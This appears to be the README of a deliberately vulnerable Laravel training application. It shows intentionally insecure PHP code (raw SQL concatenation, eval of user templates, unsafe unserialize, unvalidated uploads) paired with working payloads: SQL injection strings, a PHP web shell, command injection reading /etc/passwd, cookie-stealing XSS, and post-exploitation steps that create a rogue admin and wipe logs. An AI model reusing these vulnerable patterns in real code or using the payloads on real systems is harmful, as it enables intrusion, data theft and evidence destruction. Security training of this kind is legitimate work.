# Laravel Vulnerable Application

## Overview
A deliberately vulnerable Laravel application showcasing common security vulnerabilities in PHP Laravel applications, including framework-specific issues and misconfigurations.

## Quick Start

**Access URL**: http://localhost:8094

**Default Credentials**:
- Admin: `admin@laravel.com` / `password`
- User: `user@laravel.com` / `password`

**Laravel Telescope** (Debug Dashboard): http://localhost:8094/telescope

## Application Features

- User authentication system
- Blog with comments
- File upload system
- API endpoints
- Admin panel
- Shopping cart
- Payment processing
- Laravel Telescope enabled

## Vulnerabilities

### 1. SQL Injection
```php
// Vulnerable query
$users = DB::select("SELECT * FROM users WHERE email = '".$request->email."'");

// Attack
http://localhost:8094/search?email=' OR '1'='1
http://localhost:8094/search?email=' UNION SELECT * FROM password_resets--
```

### 2. Mass Assignment
```php
// Vulnerable model (no $fillable or $guarded)
class User extends Model {
    // All attributes are mass assignable
}

// Vulnerable controller
public function update(Request $request, User $user) {
    $user->update($request->all());
}

// Attack - Become admin
POST /users/1
_method=PUT&email=admin@evil.com&is_admin=1&email_verified_at=2023-01-01
```

### 3. Insecure File Upload
```php
public function upload(Request $request) {
    $file = $request->file('document');
    $file->move(public_path('uploads'), $file->getClientOriginalName());
}

// Attack - Upload PHP shell
shell.php: <?php system($_GET['cmd']); ?>
Access: http://localhost:8094/uploads/shell.php?cmd=whoami
```

### 4. Command Injection
```php
public function backup() {
    $filename = request('filename');
    exec("tar -czf backups/$filename.tar.gz storage/");
}

// Attack
http://localhost:8094/backup?filename=test.tar.gz; cat /etc/passwd > public/leaked.txt; echo done
```

### 5. Blade Template Injection
```php
// Unsafe compilation
$template = request('template');
$compiled = Blade::compileString($template);
eval('?>' . $compiled);

// Attack
{{ system('whoami') }}
{!! exec('cat /etc/passwd') !!}
@php(system('ls -la'))
```

### 6. Insecure Direct Object Reference (IDOR)
```php
public function downloadInvoice($id) {
    // No authorization check
    return Invoice::findOrFail($id)->download();
}

// Attack
http://localhost:8094/invoices/1/download
http://localhost:8094/invoices/2/download
```

### 7. Cross-Site Scripting (XSS)
```blade
<!-- Unsafe output -->
<div>{!! $user->bio !!}</div>
<div>{{ $comment->text }}</div> <!-- If e() is disabled -->

<!-- Attack -->
<script>alert(document.cookie)</script>
<img src=x onerror="fetch('/api/steal?c='+document.cookie)">
```

### 8. Weak Encryption
```php
// Using Laravel's old encrypt() with APP_KEY
$encrypted = encrypt($sensitiveData);

// If APP_KEY is exposed (common in .env leaks)
$decrypted = decrypt($encrypted);
```

### 9. Debug Mode & Telescope Exposed
```env
APP_DEBUG=true
APP_ENV=production

# Exposes:
# - Stack traces with code
# - Database queries
# - Environment variables
# - Session data
```

### 10. Session Fixation
```php
// Not regenerating session on login
public function login(Request $request) {
    Auth::attempt($request->only('email', 'password'));
    // Missing: $request->session()->regenerate();
}
```

### 11. API Token Vulnerabilities
```php
// Weak API token generation
$user->api_token = str_random(60); // Predictable

// No expiration
// No rate limiting
// Tokens in URLs
```

### 12. Laravel Specific RCE
```php
// Unsafe unserialize (CVE-2021-3129)
public function import(Request $request) {
    $data = unserialize(base64_decode($request->data));
}

// POP chain exploitation possible
```

## Laravel-Specific Issues

### 1. Environment File Exposure
```bash
# Common misconfigurations expose .env
http://localhost:8094/.env
http://localhost:8094/.env.backup
http://localhost:8094/storage/.env

# Contains database passwords, API keys, etc.
```

### 2. Storage Directory Exposure
```bash
# Sensitive files accessible
http://localhost:8094/storage/logs/laravel.log
http://localhost:8094/storage/framework/sessions/
http://localhost:8094/storage/app/backups/
```

### 3. Route Parameter Injection
```php
Route::get('/file/{path}', function($path) {
    return file_get_contents(storage_path($path));
})->where('path', '.*');

// Attack
http://localhost:8094/file/../../../etc/passwd
```

### 4. Queue Poisoning
```php
// Unsafe job processing
dispatch(new ProcessUserData($request->all()));

// Can lead to RCE if job processes user data unsafely
```

## Exploitation Techniques

### Laravel Tinker RCE
```bash
# If tinker is accessible
php artisan tinker
>>> system('whoami');
>>> file_get_contents('/etc/passwd');
>>> \DB::table('users')->get();
```

### Extract APP_KEY
```bash
# From error pages
trigger_error() exposing .env content

# From Laravel Telescope
http://localhost:8094/telescope/requests

# From logs
http://localhost:8094/storage/logs/laravel.log
```

### Forge Cookies/Sessions
```php
// With exposed APP_KEY
$payload = 'a:1:{s:6:"user_id";i:1;}';
$cookie = encrypt($payload);
// Set laravel_session cookie
```

### Database Extraction
```php
// Via SQL injection
' UNION SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()--

// Via Telescope
http://localhost:8094/telescope/queries
```

## Common Misconfigurations

1. **Debug mode in production** (`APP_DEBUG=true`)
2. **Weak APP_KEY** (default or exposed)
3. **Directory listing enabled**
4. **Git repository exposed** (`.git` folder)
5. **Composer files exposed** (`composer.json`, `composer.lock`)
6. **No CSRF on API routes**
7. **Permissive CORS** (`Access-Control-Allow-Origin: *`)

## Testing Tools

### Automated Scanning
```bash
# Laravel specific scanner
python3 laravelN00b.py -u http://localhost:8094

# Check common files
curl http://localhost:8094/.env
curl http://localhost:8094/config/database.php
curl http://localhost:8094/storage/logs/laravel.log

# SQL injection with sqlmap
sqlmap -u "http://localhost:8094/api/users?search=test" \
  --cookie="laravel_session=..." --batch
```

### Manual Testing
```bash
# Check debug information
curl http://localhost:8094/_ignition/health-check

# Test file upload
curl -F "file=@shell.php" http://localhost:8094/upload

# Command injection
curl "http://localhost:8094/export?file=test;id;.csv"
```

## Defense Mechanisms (What's Missing)
- ❌ Input validation
- ❌ Mass assignment protection
- ❌ CSRF verification on all routes
- ❌ Secure file upload validation
- ❌ Rate limiting
- ❌ API authentication
- ❌ Secure session configuration
- ❌ Content Security Policy

## Laravel Security Features (Disabled)

```php
// CSRF Protection Disabled
Route::post('/transfer', 'TransferController@process')
    ->withoutMiddleware(VerifyCsrfToken::class);

// Encryption Disabled
'encrypt' => false, // in config/session.php

// XSS Protection Disabled
Blade::withoutDoubleEncoding(); // Dangerous!
```

## Learning Objectives
- Understanding Laravel security features
- Common Laravel misconfigurations
- Framework-specific vulnerabilities
- Secure Laravel development practices
- Laravel debugging and information disclosure

## Post-Exploitation

```bash
# Create admin user via tinker
php artisan tinker
>>> \App\User::create(['name'=>'hacker','email'=>'hacker@evil.com','password'=>bcrypt('password'),'is_admin'=>true]);

# Clear logs
echo "" > storage/logs/laravel.log

# Dump database
php artisan db:dump
```

## Additional Resources
- [Laravel Security Documentation](https://laravel.com/docs/security)
- [OWASP PHP Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/PHP_Security_Cheat_Sheet.html)
- [Laravel Security Best Practices](https://securinglaravel.com/) 